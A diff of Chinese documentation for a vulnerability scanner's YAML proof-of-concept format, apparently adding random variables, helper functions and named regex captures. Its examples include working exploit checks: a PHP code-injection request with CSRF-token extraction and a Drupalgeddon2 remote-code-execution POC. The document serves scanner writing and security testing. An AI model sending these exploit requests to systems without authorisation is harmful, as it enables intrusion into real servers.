@@ -63,10 +63,13 @@ detail:
 整个POC是一个键值对，其包含3个键：
 
 - `name: string`
+- `set: []string` (0.13.0 版本新增)
 - `rules: []Rule`
 - `detail: map[string]string`
 
 name是POC的名字
+
+set是全局变量，比如是随机数、解析的url等，可以调用函数，在非expression语句中需要使用大括号包裹，在expression中就是普通变量。
 
 rules是一个由规则（Rule）组成的列表，后面会描述如何编写Rule，并将其组成rules。
 
@@ -127,13 +130,16 @@ expression表达式上下文包含所有CEL文档中支持的函数，同时还�
 
 函数名 | 函数原型 | 说明
 ---- | ---- | ----
-`contains` | `func (s1 string) contains(s2 string) bool` | 判断s1是否包含s2，返回bool类型结果。
-`bcontains` | `func (b1 bytes) bcontains(b2 bytes) bool` | 判断一个b1是否包含b2，返回bool类型结果。与contains不同的是，bcontains是字节流（bytes）的查找。
-`matches` | `func (s1 string) matches(s2 string) bool` | 使用正则表达式s1来匹配s2，返回bool类型匹配结果。
-`bmatches` | `func (s1 string) bmatches(b1 bytes) bool` | 使用正则表达式s1来匹配b1，返回bool类型匹配结果。与matches不同的是，bmatches匹配的是字节流（bytes）。
+`contains` | `func (s1 string) contains(s2 string) bool` | 判断s1是否包含s2，返回bool类型结果
+`bcontains` | `func (b1 bytes) bcontains(b2 bytes) bool` | 判断一个b1是否包含b2，返回bool类型结果。与contains不同的是，bcontains是字节流（bytes）的查找
+`matches` | `func (s1 string) matches(s2 string) bool` | 使用正则表达式s1来匹配s2，返回bool类型匹配结果
+`bmatches` | `func (s1 string) bmatches(b1 bytes) bool` | 使用正则表达式s1来匹配b1，返回bool类型匹配结果。与matches不同的是，bmatches匹配的是字节流（bytes）
 `startsWith` | `func (s1 string) startsWith(s2 string) bool` | 判断s1是否由s2开头
 `endsWith` | `func (s1 string) endsWith(s2 string) bool` | 判断s1是否由s2结尾
 `in` | `string in map` | map 中是否包含某个 key，目前只有 headers 是 map 类型
+`md5` | `func md5(string) string` | 字符串的 md5  (以下都是 0.13.0 版本新增)
+`randomInt` | `func randomInt(from, to int) int` | 两个范围内的随机数
+`randomLowercase` | `func randomLowercase(n length) string` | 指定长度的小写字母组成的随机字符串
 
 值得注意的是，类似于python，CEL中的字符串可以有转义和前缀，如：
 
@@ -145,6 +151,8 @@ expression表达式上下文包含所有CEL文档中支持的函数，同时还�
 
 - `body.bcontains(b'test')`
   - 返回包body包含test，因为body是一个bytes类型的变量，所以我们需要使用bcontains方法，且其参数也是bytes
+- `body.bcontains(bytes(r1+'some value'+r2))`
+  - r1、r2是randomLowercase的变量，这里动态的判断body的内容
 - `content_type.contains('application/octet-stream') && body.bcontains(b'\x00\x01\x02')`
   - 返回包的content-type包含“application/octet-stream”，且body中包含0x000102这段二进制串
 - `content_type.contains('zip') && r'^PK\x03\x04'.bmatches(body)`
@@ -175,18 +183,20 @@ rules:
     path: "/update"
     expression: "true"
     search: |
-      <input type="hidden" name="csrftoken" value="(.+?)"
+      <input type="hidden" name="csrftoken" value="(?P<token>.+?)"
   - method: POST
     path: "/update"
     body: |
-      id=';echo(md5(123));//&csrftoken={{1}}
+      id=';echo(md5(123));//&csrftoken={{token}}
     expression: |
       status == 200 && body.bcontains(b'202cb962ac59075b964b07152d234b70')
 ```
 
-目标漏洞是一个简单的代码执行，但因为是POST请求，所以需要先获取当前用户的CSRF Token。所以，我们的POC分为两个Rule，第一个Rule发送GET请求，并使用search指定的正则提取返回包中的csrftoken表单值，此时expression直接执行表达式`true`，表示第一条规则一定执行成功；第二个Rule发送POST请求，此时，我们可以在path、body、headers中使用前一个规则search的结果，如`{{0}}`、`{{1}}`等。
+目标漏洞是一个简单的代码执行，但因为是POST请求，所以需要先获取当前用户的CSRF Token。所以，我们的POC分为两个Rule，第一个Rule发送GET请求，并使用search指定的正则提取返回包中的csrftoken表单值，此时expression直接执行表达式`true`，表示第一条规则一定执行成功；第二个Rule发送POST请求，此时，我们可以在path、body、headers中使用前一个规则search的结果，如`{{token}}`等。
 
-`{{`、`}}`中包含的数字是正则的提取的group数组，0表示匹配的整个内容，1、2、3...n表示匹配到的第n个group。我这里取到的value值是第1个结果，所以使用`{{1}}`。如果正则没有匹配成功，或者n不在group范围内，这里不会进行替换。
+`{{`、`}}`中包含的名字是正则的提取的数据。如果正则没有匹配成功，这里不会进行替换。`?P<var>` 是正则表达式命名组的语法，可以到 https://regex101.com/r/VQndKy/1/ 调试和学习正则的语法。
+
+注意，0.13.0 版本之前使用的是 `{{1}}` 这样的语法。
 
 ## 如何编写借助反连平台的POC
 
@@ -271,30 +281,42 @@ expression: |
 
 ```yaml
 name: poc-yaml-drupal-drupalgeddon2-rce
+set:
+  r1: randomLowercase(4)
+  r2: randomLowercase(4)
 rules:
   - method: POST
-    path: "/?q=user/password&name[%23post_render][]=printf&name[%23type]=markup&name[%23markup]=test%25%25test"
+    path: "/?q=user/password&name[%23post_render][]=printf&name[%23type]=markup&name[%23markup]={{r1}}%25%25{{r2}}"
     headers:
+      Content-Type: application/x-www-form-urlencoded
     body: |
       form_id=user_pass&_triggering_element_name=name&_triggering_element_value=&opz=E-mail+new+Password
     search: |
-      name="form_build_id"\s+value="(.+?)"
+      name="form_build_id"\s+value="(?P<build_id>.+?)"
     expression: |
       status==200
   - method: POST
-    path: "/?q=file%2Fajax%2Fname%2F%23value%2F{{1}}"
+    path: "/?q=file%2Fajax%2Fname%2F%23value%2F{{build_id}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
     body: |
-      form_build_id={{1}}
+      form_build_id={{build_id}}
     expression: |
-      body.bcontains(b'test%test')
+      body.bcontains(bytes(r1+'%'+r2))
 detail:
-  author: phithon(https://www.leavesongs.com/)
   drupal_version: 7
   links:
     - https://github.com/dreadlocked/Drupalgeddon2
+    - https://paper.seebug.org/567/
+test:
+  target: http://cve-2018-7600-7-x.vulnet:8000/
 ```
 
-该POC分为两个Rule，第一个发送一个POST包，将我们需要的Payload注入缓存中，同时，利用search字段提取缓存ID；第二个数据包，将前面提取的缓存ID`{{1}}`，拼接到body中，触发代码执行漏洞，并使用`body.bcontains(b'test%test')`来判断是否成功执行。
+该POC首先声明了两个随机值，然后为 rule 部分。
+
+第一个发送一个POST包，将我们需要的Payload注入缓存中，同时，利用search字段提取缓存ID。
+
+第二个数据包，将前面提取的缓存ID`{{build_id}}`，拼接到body中，触发代码执行漏洞，并使用`body.bcontains(bytes(r1+'%'+r2))`来判断是否成功执行。
 
 关于这个漏洞的原理，可以参考这篇文章：<https://paper.seebug.org/578/>。
 
